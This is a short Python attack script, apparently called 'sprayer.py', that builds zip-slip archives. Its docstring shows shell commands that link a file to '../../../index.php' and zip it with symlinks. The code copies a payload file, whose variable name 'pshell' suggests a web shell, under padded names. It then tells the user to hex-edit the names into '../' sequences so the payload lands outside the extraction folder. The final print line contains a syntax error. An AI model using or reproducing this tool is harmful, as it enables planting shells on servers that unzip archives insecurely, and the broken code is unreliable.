"""
"insecure unzip 
rename files in archives ../../../file
cat > tst.txt << EIF
EIF
ln -sfn ../../../index.php tst.txt
zip tst.zip tst.txt --symlinks
"""
from  sys import argv,exit
import os
try :
  file_name = argv[1]
  lenght = int(argv[2])
  with open(file_name,"rb") as f:
      pshell = f.read()
except:
  print("[-] give valid file path\n usage sprayer.py <file_path> <number_of_dot_dot_pwn>")
  exit(0)
spray = "ZZY"
for i in range(1,lenght):
  with open(spray*i+file_name,"wb") as f:
    f.write(pshell)
os.system("zip -0 malv1.zip ZZY*") 
 
print("[+] done > now go open hex editor and replace "ZZY" by ../")
 
 
  
